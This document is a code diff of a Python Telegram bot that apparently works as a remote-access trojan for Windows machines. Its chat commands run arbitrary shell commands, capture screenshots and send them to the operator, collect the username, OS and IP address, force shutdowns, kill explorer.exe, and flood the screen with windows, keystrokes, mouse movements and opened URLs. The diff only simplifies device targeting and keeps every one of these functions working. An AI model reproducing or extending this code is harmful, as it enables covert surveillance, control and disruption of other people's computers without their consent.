@@ -7,7 +7,6 @@ import socket
 import psutil
 from telebot import types
 from PIL import ImageGrab
-import requests
 import random
 import shutil
 import webbrowser
@@ -49,46 +48,39 @@ def send_welcome(message):
         "Welcome to the multi-device bot!\n\n"
         "Commands:\n"
         "/devices - List all registered devices\n"
-        "/cmd <device_id/all> <command> - Run command on a specific device or all devices\n"
-        "/screen <device_id/all> - Take screenshot on a specific device or all devices\n"
-        "/info <device_id/all> - Get system info of a specific device or all devices\n"
-        "/shutdown <device_id/all> - Shutdown a specific device or all devices\n"
-        "/explorer_spam <device_id/all> - Spam File Explorer on a specific device or all devices\n"
-        "/stop_explorer_spam <device_id/all> - Stop File Explorer spam on a specific device or all devices\n"
-        "/open_url <device_id/all> <url> - Open a URL in the default browser on a specific device or all devices\n"
-        "/stop_url <device_id/all>"
-        "/cmd_spam <device_id/all> <command> - Spam CMD with a specific command on a specific device or all devices\n"
-        "/stop_cmd_spam <device_id/all> - Stop CMD spam on a specific device or all devices\n"
-        "/photo <device_id/all>\n"
-        "/mouse <device_id/all> x y\n"
-        "/mouse_spam <device_id/all>\n"
-        "/mouse_spam_stop <device_id/all>\n"
-        "/keyboard <device_id/all> word/letter\n"
-        "/keyboard_spam <device_id/all> word/letter\n"
-        "/keyboard_spam_stop <device_id/all>\n"
+        "/cmd <command> - Run command on a specific device or all devices\n"
+        "/screen - Take screenshot on a specific device or all devices\n"
+        "/info - Get system info of a specific device or all devices\n"
+        "/shutdown - Shutdown a specific device or all devices\n"
+        "/explorer_spam - Spam File Explorer on a specific device or all devices\n"
+        "/stop_explorer_spam - Stop File Explorer spam on a specific device or all devices\n"
+        "/open_url <url> - Open a URL in the default browser on a specific device or all devices\n"
+        "/stop_url - stops links from opening"
+        "/cmd_spam <command> - Spam CMD with a specific command on a specific device or all devices\n"
+        "/stop_cmd_spam - Stop CMD spam on a specific device or all devices\n"
+        "/photo - puts up a custom wallpaper\n"
+        "/mouse x y - moves the mouse to a given position\n"
+        "/mouse_spam - moves the mouse to random positions\n"
+        "/mouse_spam_stop - stops the mouse from moving\n"
+        "/keyboard word/letter - writes any letter/word 1 time\n"
+        "/keyboard_spam word/letter - spams an infinitely specified letter/word\n"
+        "/keyboard_spam_stop - stops keyboard spam\n"
     )
 
 @bot.message_handler(commands=['mouse'])
 def move_mousik(message):
     try:
         args = message.text.split(' ')
-        if len(args) < 4:
-            bot.send_message(message.chat.id, "Usage: /mouse <device_id/all> x y")
+        if len(args) < 3:
+            bot.send_message(message.chat.id, "Usage: /mouse x y")
             return
 
-        target_id = args[1]
-        x = int(args[2])
-        y = int(args[3])
+        x = int(args[1])
+        y = int(args[2])
 
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                pyautogui.moveTo(x, y)
-            bot.send_message(message.chat.id, f"mouse executed to all")
-        elif target_id in devices:
+        for device_id in devices.keys():
             pyautogui.moveTo(x, y)
-            bot.send_message(message.chat.id, f"mouse executed on {devices[target_id]}")
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
+        bot.send_message(message.chat.id, f"mouse executed to all")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -106,23 +98,14 @@ def move_mousik(message):
     global mouse_spam
     try:
         args = message.text.split(' ')
-        if len(args) < 2:
-            bot.send_message(message.chat.id, "Usage: /mouse_spam <device_id/all>")
+        if len(args) < 1:
+            bot.send_message(message.chat.id, "Usage: /mouse_spam")
             return
 
-        target_id = args[1]
-
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                mouse_spam = False
-                threading.Thread(target=mouse_movik, daemon=True).start()
-            bot.send_message(message.chat.id, f"mouse_spam executed to all")
-        elif target_id in devices:
+        for device_id in devices.keys():
             mouse_spam = False
             threading.Thread(target=mouse_movik, daemon=True).start()
-            bot.send_message(message.chat.id, f"mouse_spam executed on {devices[target_id]}")
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
+        bot.send_message(message.chat.id, f"mouse_spam executed to all")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -131,21 +114,13 @@ def move_mousik(message):
     global mouse_spam
     try:
         args = message.text.split(' ')
-        if len(args) < 2:
-            bot.send_message(message.chat.id, "Usage: /mouse_spam_stop <device_id/all>")
+        if len(args) < 1:
+            bot.send_message(message.chat.id, "Usage: /mouse_spam_stop")
             return
 
-        target_id = args[1]
-
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                mouse_spam = True
-            bot.send_message(message.chat.id, f"mouse_spam executed on all")
-        elif target_id in devices:
+        for device_id in devices.keys():
             mouse_spam = True
-            bot.send_message(message.chat.id, f"mouse_spam was stopped on {devices[target_id]}")
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
+        bot.send_message(message.chat.id, f"mouse_spam executed on all")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -164,33 +139,23 @@ def Keyboardik(klavishi, lett):
 def move_mousik(message):
     try:
         args = message.text.split(' ')
-        if len(args) < 3:
-            bot.send_message(message.chat.id, "Usage: /keyboard <device_id/all word/letter")
+        if len(args) < 2:
+            bot.send_message(message.chat.id, "Usage: /keyboard word/letter")
             return
 
-        target_id = args[1]
-        klavisha = str(args[2])
+        klavisha = str(args[1])
 
         if len(klavisha) > 1:
             letter = False
         else:
             letter = True
 
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                if letter == True:
-                    kb.press(klavisha)
-                else:
-                    kb.write(klavisha, delay=0.1)
-                bot.send_message(message.chat.id, f"keyboard executed on all")
-        elif target_id in devices:
+        for device_id in devices.keys():
             if letter == True:
                 kb.press(klavisha)
             else:
                 kb.write(klavisha, delay=0.1)
-            bot.send_message(message.chat.id, f"keyboard executed on {target_id}")
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
+            bot.send_message(message.chat.id, f"keyboard executed on all")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -199,29 +164,21 @@ def move_mousik(message):
     global keyboard_start
     try:
         args = message.text.split(' ')
-        if len(args) < 3:
-            bot.send_message(message.chat.id, "Usage: /keyboard_spam <device_id/all word/letter")
+        if len(args) < 2:
+            bot.send_message(message.chat.id, "Usage: /keyboard_spam word/letter")
             return
 
-        target_id = args[1]
-        klavisha = str(args[2])
+        klavisha = str(args[1])
 
         if len(klavisha) > 1:
             letter = False
         else:
             letter = True
 
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                keyboard_start = False
-                threading.Thread(target=Keyboardik, args=(klavisha, letter,), daemon=True).start()
-            bot.send_message(message.chat.id, f"keyboard_spam executed on all")
-        elif target_id in devices:
+        for device_id in devices.keys():
             keyboard_start = False
             threading.Thread(target=Keyboardik, args=(klavisha, letter,), daemon=True).start()
-            bot.send_message(message.chat.id, f"keyboard_spam executed on {devices[target_id]}")
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
+        bot.send_message(message.chat.id, f"keyboard_spam executed on all")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -230,21 +187,13 @@ def move_mousik(message):
     global keyboard_start
     try:
         args = message.text.split(' ')
-        if len(args) < 2:
-            bot.send_message(message.chat.id, "Usage: /keyboard_spam_stop <device_id/all")
+        if len(args) < 1:
+            bot.send_message(message.chat.id, "Usage: /keyboard_spam_stop")
             return
 
-        target_id = args[1]
-
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                keyboard_start = True
-            bot.send_message(message.chat.id, f"keyboard_spam was stopped to all")
-        elif target_id in devices:
+        for device_id in devices.keys():
             keyboard_start = True
-            bot.send_message(message.chat.id, f"keyboard_spam was stopped to {target_id}")
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
+        bot.send_message(message.chat.id, f"keyboard_spam was stopped to all")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -278,21 +227,13 @@ def handle_photo(message):
         file_id = message.photo[-1].file_id
         args = (message.caption or "").split(' ', 2)
         
-        if len(args) < 2:
-            bot.send_message(message.chat.id, "Usage: /photo <device_id/all>")
+        if len(args) < 1:
+            bot.send_message(message.chat.id, "Usage: /photo")
             return
-
-        target_id = args[1]
-
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                set_wallpaper(file_id)
-                bot.reply_to(message, f"Обои успешно сохранены для: {devices[device_id]}")
-        elif target_id in devices:
+        
+        for device_id in devices.keys():
             set_wallpaper(file_id)
-            bot.reply_to(message, f"Обои успешно сохранены для: {target_id}")
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
+            bot.reply_to(message, f"Обои успешно сохранены для: {devices[device_id]}")
     except Exception as e:
         bot.reply_to(message, f"Ошибка при получении фото: {e}")
 
@@ -300,22 +241,15 @@ def handle_photo(message):
 def run_command(message):
     try:
         args = message.text.split(' ', 2)
-        if len(args) < 3:
-            bot.send_message(message.chat.id, "Usage: /cmd <device_id/all> <command>")
+        if len(args) < 2:
+            bot.send_message(message.chat.id, "Usage: /cmd <command>")
             return
 
-        target_id = args[1]
-        command = args[2]
+        command = args[1]
 
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                subprocess.Popen(command, shell=True)
-                bot.send_message(message.chat.id, f"Broadcast command executed on {devices[device_id]}: {command}")
-        elif target_id in devices:
+        for device_id in devices.keys():
             subprocess.Popen(command, shell=True)
-            bot.send_message(message.chat.id, f"Command executed on {devices[target_id]}: {command}")
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
+            bot.send_message(message.chat.id, f"Broadcast command executed on {devices[device_id]}: {command}")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -323,70 +257,45 @@ def run_command(message):
 def take_screenshot(message):
     try:
         args = message.text.split(' ')
-        if len(args) < 2:
-            bot.send_message(message.chat.id, "Usage: /screen <device_id/all>")
+        if len(args) < 1:
+            bot.send_message(message.chat.id, "Usage: /screen")
             return
 
-        target_id = args[1]
-
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                screen_path = os.path.join(os.getenv('APPDATA'), f'Screenshot_{device_id}.jpg')
-                ImageGrab.grab().save(screen_path)
-                with open(screen_path, 'rb') as screen:
-                    bot.send_photo(message.chat.id, screen)
-                os.remove(screen_path)
-        elif target_id in devices:
-            screen_path = os.path.join(os.getenv('APPDATA'), 'Screenshot.jpg')
+        for device_id in devices.keys():
+            screen_path = os.path.join(os.getenv('APPDATA'), f'Screenshot_{device_id}.jpg')
             ImageGrab.grab().save(screen_path)
             with open(screen_path, 'rb') as screen:
                 bot.send_photo(message.chat.id, screen)
             os.remove(screen_path)
-            bot.send_message(message.chat.id, "Screenshot taken.")
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
+
+def get_local_ip():
+    hostname = socket.gethostname()
+    local_ip = socket.gethostbyname(hostname)
+    return local_ip
 
 @bot.message_handler(commands=['info'])
 def get_system_info(message):
     try:
         args = message.text.split(' ')
-        if len(args) < 2:
-            bot.send_message(message.chat.id, "Usage: /info <device_id/all>")
+        if len(args) < 1:
+            bot.send_message(message.chat.id, "Usage: /info")
             return
 
-        target_id = args[1]
-
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                username = getpass.getuser()
-                os_info = platform.platform()
-                processor = platform.processor()
-                ip = requests.get('http://ip.42.pl/raw').text
-                bot.send_message(
-                    message.chat.id,
-                    f"System Info for {devices[device_id]}:\n"
-                    f"Username: {username}\n"
-                    f"OS: {os_info}\n"
-                    f"Processor: {processor}\n"
-                    f"Public IP: {ip}"
-                )
-        elif target_id in devices:
-            username = os.getlogin()
+        for device_id in devices.keys():
+            username = getpass.getuser()
             os_info = platform.platform()
             processor = platform.processor()
-            ip = requests.get('http://ip.42.pl/raw').text
+            ip = get_local_ip()
             bot.send_message(
                 message.chat.id,
-                f"System Info for {devices[target_id]}:\n"
+                f"System Info for {devices[device_id]}:\n"
                 f"Username: {username}\n"
                 f"OS: {os_info}\n"
                 f"Processor: {processor}\n"
-                f"Public IP: {ip}"
+                f"IP: {ip}"
             )
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -394,21 +303,13 @@ def get_system_info(message):
 def shutdown_device(message):
     try:
         args = message.text.split(' ')
-        if len(args) < 2:
-            bot.send_message(message.chat.id, "Usage: /shutdown <device_id/all>")
+        if len(args) < 1:
+            bot.send_message(message.chat.id, "Usage: /shutdown")
             return
 
-        target_id = args[1]
-
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                os.system('shutdown /s /f /t 0')
-                bot.send_message(message.chat.id, f"Shutdown command executed on {devices[device_id]}.")
-        elif target_id in devices:
+        for device_id in devices.keys():
             os.system('shutdown /s /f /t 0')
-            bot.send_message(message.chat.id, f"Shutdown command executed on {devices[target_id]}.")
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")  
+            bot.send_message(message.chat.id, f"Shutdown command executed on {devices[device_id]}.")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -416,23 +317,14 @@ def shutdown_device(message):
 def explorer_spam(message):
     try:
         args = message.text.split(' ')
-        if len(args) < 2:
-            bot.send_message(message.chat.id, "Usage: /explorer_spam <device_id/all>")
+        if len(args) < 1:
+            bot.send_message(message.chat.id, "Usage: /explorer_spam")
             return
 
-        target_id = args[1]
-
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                for _ in range(50):  # Количество окон, можно изменить
-                    subprocess.Popen('explorer')
-                bot.send_message(message.chat.id, f"Explorer spam executed on {devices[device_id]}.")
-        elif target_id in devices:
-            for _ in range(50):  # Количество окон, можно изменить
+        for device_id in devices.keys():
+            for _ in range(50):
                 subprocess.Popen('explorer')
-            bot.send_message(message.chat.id, f"Explorer spam executed on {devices[target_id]}.")
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
+            bot.send_message(message.chat.id, f"Explorer spam executed on {devices[device_id]}.")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -440,26 +332,18 @@ def explorer_spam(message):
 def stop_explorer_spam(message):
     try:
         args = message.text.split(' ')
-        if len(args) < 2:
-            bot.send_message(message.chat.id, "Usage: /stop_explorer_spam <device_id/all>")
+        if len(args) < 1:
+            bot.send_message(message.chat.id, "Usage: /stop_explorer_spam")
             return
-
-        target_id = args[1]
 
         def kill_explorer():
             for proc in psutil.process_iter(['name']):
                 if proc.info['name'] == 'explorer.exe':
                     proc.kill()
 
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                kill_explorer()
-                bot.send_message(message.chat.id, f"Stopped Explorer spam on {devices[device_id]}.")
-        elif target_id in devices:
+        for device_id in devices.keys():
             kill_explorer()
-            bot.send_message(message.chat.id, f"Stopped Explorer spam on {devices[target_id]}.")
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
+            bot.send_message(message.chat.id, f"Stopped Explorer spam on {devices[device_id]}.")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -476,27 +360,19 @@ def open_url(message):
     global open_url
     try:
         args = message.text.split(' ', 2)
-        if len(args) < 3:
-            bot.send_message(message.chat.id, "Usage: /open_url <device_id/all> <url>")
+        if len(args) < 2:
+            bot.send_message(message.chat.id, "Usage: /open_url <url>")
             return
 
-        target_id = args[1]
-        url = args[2]
+        url = args[1]
 
         if not (url.startswith("http://") or url.startswith("https://")):
             url = "https://" + url
 
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                open_url = False
-                threading.Thread(target=open_links, args=(url,), daemon=True).start()
-                bot.send_message(message.chat.id, f"URL opened on {devices[device_id]}: {url}")
-        elif target_id in devices:
+        for device_id in devices.keys():
             open_url = False
             threading.Thread(target=open_links, args=(url,), daemon=True).start()
-            bot.send_message(message.chat.id, f"URL opened on {devices[target_id]}: {url}")
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
+            bot.send_message(message.chat.id, f"URL opened on {devices[device_id]}: {url}")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
@@ -505,21 +381,13 @@ def open_url(message):
     global open_url
     try:
         args = message.text.split(' ', 2)
-        if len(args) < 2:
-            bot.send_message(message.chat.id, "Usage: /stop_url <device_id/all>")
+        if len(args) < 1:
+            bot.send_message(message.chat.id, "Usage: /stop_url")
             return
 
-        target_id = args[1]
-
-        if target_id.lower() == 'all':
-            for device_id in devices.keys():
-                open_url = True
-                bot.send_message(message.chat.id, f"URL stopped on {devices[device_id]}")
-        elif target_id in devices:
+        for device_id in devices.keys():
             open_url = True
-            bot.send_message(message.chat.id, f"URL stopped on {devices[target_id]}")
-        else:
-            bot.send_message(message.chat.id, f"Device with ID {target_id} not found.")
+            bot.send_message(message.chat.id, f"URL stopped on {devices[device_id]}")
     except Exception as e:
         bot.send_message(message.chat.id, f"Error: {e}")
 
